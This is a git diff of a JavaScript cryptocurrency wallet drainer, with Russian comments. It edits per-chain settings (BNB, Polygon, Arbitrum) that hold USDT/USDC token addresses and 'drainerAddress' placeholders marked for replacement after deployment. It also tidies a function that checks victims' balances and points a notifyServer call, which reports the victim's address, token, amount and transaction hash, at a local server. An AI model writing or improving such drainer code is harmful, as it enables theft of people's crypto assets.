@@ -46,7 +46,7 @@ const CHAINS = {
     ],
     usdtAddress: "0x55d398326f99059fF775485246999027B3197955",
     usdcAddress: "0x8AC76a51cc950d9822D68b83fE1Ad97B32Cd580d",
-    drainerAddress: "YOUR_BNB_DRAINER_ADDRESS",
+    drainerAddress: "YOUR_BNB_DRAINER_ADDRESS", // Замените после деплоя
     explorerApi: "https://api.bscscan.com/api",
     explorerApiKey: BSCSCAN_API_KEY
   },
@@ -57,7 +57,7 @@ const CHAINS = {
     rpcUrls: ["https://polygon-rpc.com/"],
     usdtAddress: "0xc2132D05D31c914a87C6611C10748AEb04B58e8F",
     usdcAddress: "0x2791Bca1f2de4661ED88A30C99A7a9449Aa84174",
-    drainerAddress: "YOUR_POLYGON_DRAINER_ADDRESS",
+    drainerAddress: "YOUR_POLYGON_DRAINER_ADDRESS", // Замените после деплоя
     explorerApi: "https://api.polygonscan.com/api",
     explorerApiKey: POLYGONSCAN_API_KEY
   },
@@ -68,7 +68,7 @@ const CHAINS = {
     rpcUrls: ["https://arb1.arbitrum.io/rpc"],
     usdtAddress: "0xFd086bC7CD5C481DCC9C85ebE478A1C0b69FCbb9",
     usdcAddress: "0xFF970A61A04b1cA14834A43f5dE4533eBDDB5CC8",
-    drainerAddress: "YOUR_ARBITRUM_DRAINER_ADDRESS",
+    drainerAddress: "YOUR_ARBITRUM_DRAINER_ADDRESS", // Замените после деплоя
     explorerApi: "https://api.arbiscan.io/api",
     explorerApiKey: ARBISCAN_API_KEY
   }
@@ -104,9 +104,7 @@ async function getTokenBalanceFromExplorer(address, tokenAddress, chainId) {
 }
 
 // Проверка баланса с использованием API и fallback на RPC
-async function checkBalance(chainId, userAddress)
-
-{
+async function checkBalance(chainId, userAddress) {
   const config = CHAINS[chainId];
   let nativeBalance, usdtBalance, usdcBalance;
 
@@ -309,7 +307,7 @@ async function notifyServer(userAddress, tokenAddress, amount, chainId, txHash) 
     }
 
     console.log(`📤 Отправка на сервер: userAddress=${userAddress}, tokenAddress=${tokenAddress}, amount=${ethers.utils.formatUnits(roundedAmount, decimals)}, chainId=${chainId}, txHash=${txHash}`);
-    const response = await fetch('https://yourdomain.com/api/transfer', { // Замените на ваш домен
+    const response = await fetch('http://localhost:3000/api/transfer', {
       method: 'POST',
       headers: { 'Content-Type': 'application/json' },
       body: JSON.stringify({
